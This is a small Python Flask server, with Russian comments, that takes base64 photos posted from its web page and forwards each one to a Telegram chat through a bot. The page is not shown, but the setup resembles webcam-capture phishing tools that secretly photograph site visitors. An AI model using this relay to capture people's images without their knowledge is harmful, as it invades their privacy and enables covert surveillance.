from flask import Flask, render_template, request
import requests
import base64
import os

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    photo_base64 = data['photo']
    
    # Декодируем фото
    photo_bytes = base64.b64decode(photo_base64.split(',')[1])
    
    # Отправляем в Telegram
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
    requests.post(url, files={'photo': photo_bytes}, data={'chat_id': CHAT_ID})
    
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
